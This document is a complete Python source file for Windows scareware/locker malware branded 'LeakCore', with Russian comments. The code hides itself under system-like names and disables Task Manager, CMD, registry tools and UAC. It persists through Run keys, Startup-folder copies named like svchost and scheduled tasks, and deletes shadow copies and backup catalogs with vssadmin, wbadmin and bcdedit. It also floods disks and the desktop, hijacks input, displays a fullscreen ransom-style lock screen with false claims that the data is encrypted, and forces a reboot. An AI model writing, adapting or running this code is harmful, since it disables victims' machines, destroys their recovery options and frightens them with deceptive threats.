import os
import sys
import ctypes
import tkinter as tk
from tkinter import messagebox
import time
import random
import subprocess
import winreg as reg
import shutil
import threading
import winsound
import string

# ==================== ПАРОЛЬ ====================
CODE = "LeakCore67148842526767671488917162763635628292928276318292736393020heuewiejg3iwlwp1o12jb3veu2iiebrh3o3oeh4b3o30eirbdn"

try:
    SCREEN_WIDTH = ctypes.windll.user32.GetSystemMetrics(0)
    SCREEN_HEIGHT = ctypes.windll.user32.GetSystemMetrics(1)
except:
    SCREEN_WIDTH = 1920
    SCREEN_HEIGHT = 1080

# ========== МОДУЛЬ 1: СКРЫТИЕ ==========
def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        ctypes.windll.kernel32.SetConsoleTitleW("Windows Host Process")
    except:
        pass

# ========== МОДУЛЬ 2: ЖЕСТКАЯ БЛОКИРОВКА СИСТЕМЫ ==========
def hard_block():
    try:
        # Блокировка мыши и клавиатуры
        ctypes.windll.user32.BlockInput(True)
        
        # Скрываем панель задач
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        
        # Скрываем рабочий стол
        hwnd = ctypes.windll.user32.FindWindowW("Progman", None)
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        
        # Скрываем все окна проводника
        hwnd = ctypes.windll.user32.FindWindowW("ExploreWClass", None)
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        
        # Отключаем диспетчер задач
        try:
            key = reg.HKEY_CURRENT_USER
            path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            handle = reg.CreateKey(key, path)
            reg.SetValueEx(handle, "DisableTaskMgr", 0, reg.REG_DWORD, 1)
            reg.SetValueEx(handle, "DisableRegistryTools", 0, reg.REG_DWORD, 1)
            reg.SetValueEx(handle, "DisableCMD", 0, reg.REG_DWORD, 1)
            reg.CloseKey(handle)
        except:
            pass
        
        # Отключаем UAC
        try:
            key = reg.HKEY_LOCAL_MACHINE
            path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            handle = reg.CreateKey(key, path)
            reg.SetValueEx(handle, "EnableLUA", 0, reg.REG_DWORD, 0)
            reg.CloseKey(handle)
        except:
            pass
        
        # Блокируем Alt+F4 и другие комбинации
        def hook():
            pass
        
        # Блокируем Ctrl+Alt+Del через реестр
        try:
            key = reg.HKEY_CURRENT_USER
            path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            handle = reg.CreateKey(key, path)
            reg.SetValueEx(handle, "DisableCAD", 0, reg.REG_DWORD, 1)
            reg.CloseKey(handle)
        except:
            pass
            
    except:
        pass

# ========== МОДУЛЬ 3: МНОГОКРАТНЫЙ АВТОЗАПУСК ==========
def add_to_startup_multi():
    try:
        current_file = os.path.abspath(__file__)
        
        # В реестр (3 записи)
        keys = ["LeakCore", "WindowsUpdate", "SecurityHost"]
        key = reg.HKEY_CURRENT_USER
        path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        handle = reg.OpenKey(key, path, 0, reg.KEY_WRITE)
        for k in keys:
            reg.SetValueEx(handle, k, 0, reg.REG_SZ, sys.executable + " " + current_file)
        reg.CloseKey(handle)
        
        # В папку автозагрузки (3 копии)
        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        for i in range(3):
            shutil.copy(current_file, os.path.join(startup_folder, f"svchost_{i}.pyw"))
        
        # В планировщик задач (3 задачи)
        for i in range(3):
            subprocess.run(
                f'schtasks /create /tn "WindowsUpdate_{i}" /tr "{sys.executable} {current_file}" /sc minute /mo 1 /f',
                shell=True, capture_output=True
            )
            subprocess.run(
                f'schtasks /create /tn "SystemCheck_{i}" /tr "{sys.executable} {current_file}" /sc onlogon /f',
                shell=True, capture_output=True
            )
        
        # Добавляем в автозапуск через реестр HKEY_LOCAL_MACHINE
        try:
            key = reg.HKEY_LOCAL_MACHINE
            path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            handle = reg.OpenKey(key, path, 0, reg.KEY_WRITE)
            reg.SetValueEx(handle, "WindowsHost", 0, reg.REG_SZ, sys.executable + " " + current_file)
            reg.CloseKey(handle)
        except:
            pass
            
    except:
        pass

# ========== МОДУЛЬ 4: СТРАШНАЯ МУЗЫКА (СИРЕНА) ==========
def play_scary_music():
    frequencies = [100, 200, 300, 400, 500, 600, 700, 800, 900, 1000, 1100, 1200, 1300, 1400, 1500, 1600, 1700, 1800, 1900, 2000]
    durations = [50, 50, 50, 50, 50, 50, 50, 50, 50, 50, 50, 50, 50, 50, 50, 50, 50, 50, 50, 50]
    while True:
        try:
            for i in range(len(frequencies)):
                winsound.Beep(frequencies[i], durations[i])
            for i in range(len(frequencies)-1, -1, -1):
                winsound.Beep(frequencies[i], durations[i])
            time.sleep(0.1)
        except:
            pass

# ========== МОДУЛЬ 5: ЗАСОРИТЬ ВСЕ ДИСКИ ==========
def flood_all_disks():
    drives = ['C:', 'D:', 'E:', 'F:', 'G:', 'H:']
    while True:
        try:
            for drive in drives:
                if os.path.exists(drive):
                    for i in range(10):
                        folder_name = f"{drive}\\LEAKCORE_VIRUS_{random.randint(10000, 99999)}"
                        os.makedirs(folder_name, exist_ok=True)
                        # Создаем файлы внутри
                        for j in range(5):
                            file_path = os.path.join(folder_name, f"SYSTEM_BREACH_{j}.txt")
                            with open(file_path, 'w') as f:
                                f.write("LEAKCORE - ВАША СИСТЕМА УНИЧТОЖЕНА\n")
                                f.write("ВСЕ ДАННЫЕ ЗАШИФРОВАНЫ\n")
                                f.write(f"ПАРОЛЬ: {CODE}\n")
            time.sleep(5)
        except:
            pass

# ========== МОДУЛЬ 6: ЗАСОРИТЬ РАБОЧИЙ СТОЛ ==========
def flood_desktop():
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    while True:
        try:
            names = [
                "LEAKCORE_VIRUS", "SYSTEM_BREACH", "DATA_LEAK", "ACCESS_DENIED", 
                "LOCKED_BY_LEAKCORE", "DELETE_ME", "CRITICAL_ERROR", "SYSTEM_FAILURE",
                "WARNING_VIRUS", "HACKED_BY_LEAKCORE", "YOUR_DATA_IS_GONE", "PAY_OR_DIE",
                "SYSTEM_DESTROYED", "NO_RECOVERY", "FOREVER_LOST", "LEAKCORE_TEAM"
            ]
            for name in names:
                folder_path = os.path.join(desktop, f"{name}_{random.randint(1000, 99999)}")
                os.makedirs(folder_path, exist_ok=True)
                # Создаем файл с сообщением в каждой папке
                file_path = os.path.join(folder_path, "README.txt")
                with open(file_path, 'w') as f:
                    f.write("LEAKCORE\n")
                    f.write("Best cracks 2026 by leakcore team\n")
                    f.write(f"ПАРОЛЬ ДЛЯ РАЗБЛОКИРОВКИ: {CODE}\n")
            time.sleep(1)
        except:
            pass

# ========== МОДУЛЬ 7: ПОТОП ОКОН ==========
def flood_windows():
    while True:
        try:
            # CMD окна
            for i in range(10):
                subprocess.Popen(f"cmd /k color {random.randint(0,9)}{random.randint(0,9)} & title LEAKCORE_{i} & echo [LEAKCORE] СИСТЕМА УНИЧТОЖЕНА & echo [LEAKCORE] ВСЕ ДАННЫЕ ЗАШИФРОВАНЫ & echo [LEAKCORE] ПАРОЛЬ: {CODE}", shell=True)
            
            # Проводники
            for i in range(5):
                subprocess.Popen("explorer C:\\Windows\\System32", shell=True)
                subprocess.Popen("explorer C:\\Windows\\Temp", shell=True)
                subprocess.Popen("explorer C:\\", shell=True)
            
            # Блокноты с сообщением
            for i in range(5):
                temp_file = os.path.join(os.environ['TEMP'], f"leakcore_{i}.txt")
                with open(temp_file, 'w') as f:
                    f.write("LEAKCORE - ВАША СИСТЕМА УНИЧТОЖЕНА\n")
                    f.write(f"ПАРОЛЬ: {CODE}\n")
                subprocess.Popen(f"notepad.exe {temp_file}", shell=True)
            
            time.sleep(2)
        except:
            pass

# ========== МОДУЛЬ 8: ХАОС МЫШИ ==========
def mouse_chaos():
    while True:
        try:
            x = random.randint(0, SCREEN_WIDTH)
            y = random.randint(0, SCREEN_HEIGHT)
            ctypes.windll.user32.SetCursorPos(x, y)
            time.sleep(0.01)
        except:
            pass

# ========== МОДУЛЬ 9: БОМБА СООБЩЕНИЙ ==========
def message_bomb():
    while True:
        try:
            titles = ["LEAKCORE", "СИСТЕМА ВЗЛОМАНА", "КРИТИЧЕСКАЯ ОШИБКА", "ДОСТУП ЗАКРЫТ", "ВНИМАНИЕ", "ТРЕВОГА"]
            messages = [
                f"LEAKCORE: ВАША СИСТЕМА ЗАБЛОКИРОВАНА\nПАРОЛЬ: {CODE}",
                f"LEAKCORE: ВСЕ ДАННЫЕ ЗАШИФРОВАНЫ\nПАРОЛЬ: {CODE}",
                f"LEAKCORE: ДОСТУП К ФАЙЛАМ ЗАКРЫТ\nПАРОЛЬ: {CODE}",
                f"LEAKCORE: НЕ ПЫТАЙТЕСЬ ВОССТАНОВИТЬ\nПАРОЛЬ: {CODE}",
                f"LEAKCORE: СИСТЕМА БУДЕТ УНИЧТОЖЕНА\nПАРОЛЬ: {CODE}",
                f"LEAKCORE: ВАШ IP ЗАЛОГИРОВАН\nПАРОЛЬ: {CODE}"
            ]
            for i in range(10):
                ctypes.windll.user32.MessageBoxW(0, random.choice(messages), random.choice(titles), 0x10 | 0x1000)
            time.sleep(0.3)
        except:
            pass

# ========== МОДУЛЬ 10: ХАОС КЛАВИАТУРЫ ==========
def keyboard_chaos():
    while True:
        try:
            # Caps Lock
            ctypes.windll.user32.keybd_event(0x14, 0, 0x0001, 0)
            time.sleep(0.05)
            ctypes.windll.user32.keybd_event(0x14, 0, 0x0002, 0)
            time.sleep(0.05)
            # Num Lock
            ctypes.windll.user32.keybd_event(0x90, 0, 0x0001, 0)
            time.sleep(0.05)
            ctypes.windll.user32.keybd_event(0x90, 0, 0x0002, 0)
            time.sleep(0.05)
            # Scroll Lock
            ctypes.windll.user32.keybd_event(0x91, 0, 0x0001, 0)
            time.sleep(0.05)
            ctypes.windll.user32.keybd_event(0x91, 0, 0x0002, 0)
            time.sleep(0.05)
        except:
            pass

# ========== МОДУЛЬ 11: КРАСНЫЙ ЭКРАН СМЕРТИ ==========
def red_screen_of_death():
    try:
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)
        root.configure(bg='red')
        root.overrideredirect(True)
        
        label = tk.Label(
            root,
            text="""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                              L E A K C O R E                                  ║
║                         КРИТИЧЕСКАЯ ОШИБКА СИСТЕМЫ                             ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║                    ⚠️ ВАША СИСТЕМА ПОЛНОСТЬЮ УНИЧТОЖЕНА ⚠️                     ║
║                                                                               ║
║                    ВСЕ ДАННЫЕ ЗАШИФРОВАНЫ И БЕЗВОЗВРАТНО УДАЛЕНЫ              ║
║                                                                               ║
║                    ДОСТУП К ОПЕРАЦИОННОЙ СИСТЕМЕ ЗАКРЫТ                       ║
║                                                                               ║
║                    ЕДИНСТВЕННЫЙ СПОСОБ ВОССТАНОВЛЕНИЯ - КЛЮЧ                  ║
║                                                                               ║
║                    ═══════════════════════════════════════════════             ║
║                                                                               ║
║                              ВВЕДИТЕ КЛЮЧ ДОСТУПА:                            ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
            """,
            font=("Courier", 18, "bold"),
            fg="white",
            bg="red",
            justify="center"
        )
        label.pack(expand=True)
        
        entry = tk.Entry(root, font=("Courier", 16), bg="black", fg="white", justify="center", width=80)
        entry.pack(pady=20)
        entry.focus()
        
        error_label = tk.Label(root, text="", font=("Courier", 12), fg="yellow", bg="red")
        error_label.pack()
        
        def check_code(event=None):
            if entry.get() == CODE:
                try:
                    ctypes.windll.user32.BlockInput(False)
                    hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
                    ctypes.windll.user32.ShowWindow(hwnd, 1)
                    root.destroy()
                except:
                    pass
                messagebox.showinfo("LeakCore", "Система разблокирована. Но данные не восстановить.")
                try:
                    os.remove(sys.executable)
                except:
                    pass
                sys.exit()
            else:
                error_label.config(text="❌ НЕВЕРНЫЙ КЛЮЧ! ДОСТУП ЗАПРЕЩЕН! ❌")
                entry.delete(0, tk.END)
                for _ in range(30):
                    x = random.randint(0, SCREEN_WIDTH)
                    y = random.randint(0, SCREEN_HEIGHT)
                    ctypes.windll.user32.SetCursorPos(x, y)
                    time.sleep(0.01)
        
        entry.bind('<Return>', check_code)
        
        def block_keys(event):
            if event.keysym in ['Escape', 'F4', 'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12']:
                return "break"
            if event.state & 0x0004 and event.keysym == 'Delete':
                return "break"
            if event.state & 0x0002 and event.keysym == 'F4':
                return "break"
        
        root.bind('<Key>', block_keys)
        
        def focus_in():
            root.lift()
            root.focus_force()
        
        root.bind('<FocusOut>', lambda e: root.after(10, focus_in))
        
        root.mainloop()
        
    except:
        pass

# ========== МОДУЛЬ 12: ПЕРЕЗАГРУЗКА С УГРОЗОЙ ==========
def shutdown_threat():
    time.sleep(45)
    try:
        subprocess.run("shutdown /r /t 15 /c \"LeakCore: СИСТЕМА УНИЧТОЖЕНА. ВСЕ ДАННЫЕ УДАЛЕНЫ. ПЕРЕЗАГРУЗКА ЧЕРЕЗ 15 СЕКУНД.\"", shell=True)
    except:
        pass

# ========== МОДУЛЬ 13: УНИЧТОЖЕНИЕ ТОЧЕК ВОССТАНОВЛЕНИЯ ==========
def delete_restore_points():
    try:
        subprocess.run("vssadmin delete shadows /all /quiet", shell=True)
        subprocess.run("wbadmin delete catalog -quiet", shell=True)
        subprocess.run("bcdedit /set {default} recoveryenabled No", shell=True)
        subprocess.run("bcdedit /set {default} bootstatuspolicy ignoreallfailures", shell=True)
    except:
        pass

# ========== ГЛАВНАЯ ФУНКЦИЯ ==========
def main():
    hide_console()
    add_to_startup_multi()
    delete_restore_points()
    hard_block()
    
    threads = [
        threading.Thread(target=play_scary_music, daemon=True),
        threading.Thread(target=flood_all_disks, daemon=True),
        threading.Thread(target=flood_desktop, daemon=True),
        threading.Thread(target=flood_windows, daemon=True),
        threading.Thread(target=mouse_chaos, daemon=True),
        threading.Thread(target=message_bomb, daemon=True),
        threading.Thread(target=keyboard_chaos, daemon=True),
        threading.Thread(target=shutdown_threat, daemon=True)
    ]
    
    for t in threads:
        t.start()
    
    red_screen_of_death()

if __name__ == "__main__":
    main()